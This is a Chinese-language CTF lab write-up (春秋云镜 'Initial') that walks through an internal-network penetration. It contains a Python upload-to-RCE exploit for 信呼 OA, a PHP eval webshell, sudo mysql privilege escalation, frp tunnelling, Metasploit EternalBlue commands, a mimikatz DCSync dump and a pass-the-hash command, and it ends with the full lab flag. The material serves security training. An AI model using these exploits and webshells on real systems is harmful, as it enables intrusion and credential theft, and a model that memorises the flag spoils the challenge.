---
title: 春秋云镜Initial-WriteUP
date: 2025-03-20 21:14:02
tags:
---

<meta name="referrer" content="no-referrer">


# Initial

## 一、靶标介绍

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Initial/1.png)

`Initial`是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个`flag`，各部分位于不同的机器上。



## 二、渗透阶段

### 一、flag01

用`fscan`扫描一下，发现`80`端口是开放的且存在一个`rce`漏洞

```
fscan.exe -h ip
```

![](https://gitee.com/ttovlove/images/raw/master/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/Initial/2.png)

使用`ThinkPHPGUI`工具传马上去

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/3.png)

使用蚁剑连接上去，接下来是提权

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/4.png)

先看看`sudo -l`有没有什么可以用的，发现一个`mysql`可以提权，使用`mysql`提权

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/5.png)

```
sudo -l
sudo mysql -e '\! id'
sudo mysql -e '\! cat /root/flag/flag01.txt'
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/6.png)

成功拿到第一段`flag`

```
flag01: flag{60b53231-
```



### 二、flag02

传一个`fscan`上去扫一下内网

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/7.png)

先看一下`ip`

```
ifconfig
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/8.png)

接着用刚才传上去的`fscan`扫描一下

```
chmod +x ./fscan
./fscan -h 172.22.1.15/24
cat result.txt
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/9.png)

从中可以知道我们的目标:

```
172.22.1.2:DC域控
172.22.1.21:Windows的机器并且存在MS17-010 漏洞
172.22.1.18:信呼OA办公系统
```

我们的最终目标即为 `DC` 域控
我们首先对 `OA` 办公系统进行攻击，在这之前我们要先进行内网穿透

**内网穿透**

同样的在蚁剑上将`frpc`和`frpc.ini`传上去

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/10.png)

接着我们先在`VPS`上开启`frps`服务

```
./frps -c frps.ini
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/12.png)

然后给`frpc`运行权限

```
chmod 777 ./frpc
./frpc -c frpc.ini
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/11.png)

查看`VPS`上

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/12.png)

成功连接上后我们使用`proxifier`配置全局代理

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/13.png)

配置完代理就可以通过本地连接上`172.22.1.21`

浏览器查看

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/14.png)

这里是弱密码，admin/admin123

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/15.png)

信呼 OA 有一个 `0day`，弱口令 admin/admin123 登录后台可以直接打 `exp`



**exp**:

```
import requests


session = requests.session()

url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'

data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}


r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'r+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']

url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'

r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir');")
print(r.text)

```

相同目录下还要有个一句话木马

```
<?=eval($_POST[hacker]);?>
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/16.png)

成功运行后可以看到文件上传的路径，接着用蚁剑连接上去

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/17.png)

连接成功后在 `Administrator` 用户的目录下找到 `flag02`

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/18.png)





```
flag02: 2ce3-4813-87d4-
```



### 三、flag03

接下来就是对 `ip 172.22.1.21` 进行渗透，这里需要用到渗透框架 `Metasploit Framework`，`kali` 自带这个框架，这里的攻击机我选用 `kali`（windows也可以安装Metasploit Framework，不过上面我说过也要讲讲如何在kali设置代理）。我们首先要在 `kali` 中设置 `socks5` 代理，否则我们无法访问其内网的环境。
在 `kali` 中设置代理比 `windows` 简单很多，他自带了一个 `proxychains4` 工具，我们只需要编辑 `etc` 目录下的 `proxychians.conf` 文件：

```
vim /etc/proxychain.conf
```

只需要在配置文件的最后加上

```
socks5 vps port
```

在上面用 `fscan` 的扫描中我们发现该机子存在 `MS17-010` 漏洞，这个就是大名鼎鼎的永恒之蓝漏洞
我们先在 `kali` 输入 `proxychain4 msfconsole` 使用`proxychain`启动 `Metasploit Framework` （后面简称 `msf`）

```
proxychains4 msfconsole
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/20.png)

输入 `search ms17-010` 搜索 `ms17-010` 相关模块，可以看到一共找到了 `4` 个不同的模块，我们选择使用第一个模块，因为他影响是版本比较多

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/19.png)

```
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp_uuid
set RHOSTS 172.22.1.21
exploit
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/21.png)

运行成功会出现

```
meterpreter>
```

该 `Meterpreter` 是 `metasploit` 的一个扩展模块，可以调用 `metasploit` 的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传/下载文件、创建持久后门等

接着我们已经成功的打进该主机，遗憾的是该机子上并没有 `flag` ，也就是说我们最后的`flag` 在 `windows DC` 域控制器上面
接下来是进行 `DCSync` 攻击，这里简单解释一下：
首先，什么是 `DCSync`

```
在域中，不同的域控之间，默认每隔15min就会进行一次域数据同步。当一个额外的域控想从其他域控同步数据时，额外域控会像其他域控发起请求，请求同步数据。如果需要同步的数据比较多，则会重复上述过程。DCSync就是利用这个原理，通过目录复制服务（Directory Replication Service，DRS）的GetNCChanges接口像域控发起数据同步请求，以获得指定域控上的活动目录数据。目录复制服务也是一种用于在活动目录中复制和管理数据的RPC协议。该协议由两个RPC接口组成。分别是drsuapi和dsaop。
DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash
```

也就是说我们可以通过 `DCSync` 来导出所有用户的 `hash` 然后进行哈希传递攻击，要想使用 `DCSync` 必须获得以下任一用户的权限：

> Administrators 组内的用户
> Domain Admins 组内的用户
> Enterprise Admins 组内的用户域控制器的计算机帐户



```
load kiwi  # 调用mimikatz模块
kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit  # 导出域内所有用户的信息(包括哈希值)
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/22.png)

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/23.png)

接下来我们使用 `crackmapexec` 来进行哈希传递攻击，来实现 `DC域控` 上的任意命令执行，通过以下命令来获取 `flag03`

```
proxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

![](https://gitee.com/ttovlove/images/raw/master/images/春秋云镜/Initial/30.png)



```
flag03: e8f88d0d43d6}
```



### Flag

```
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```

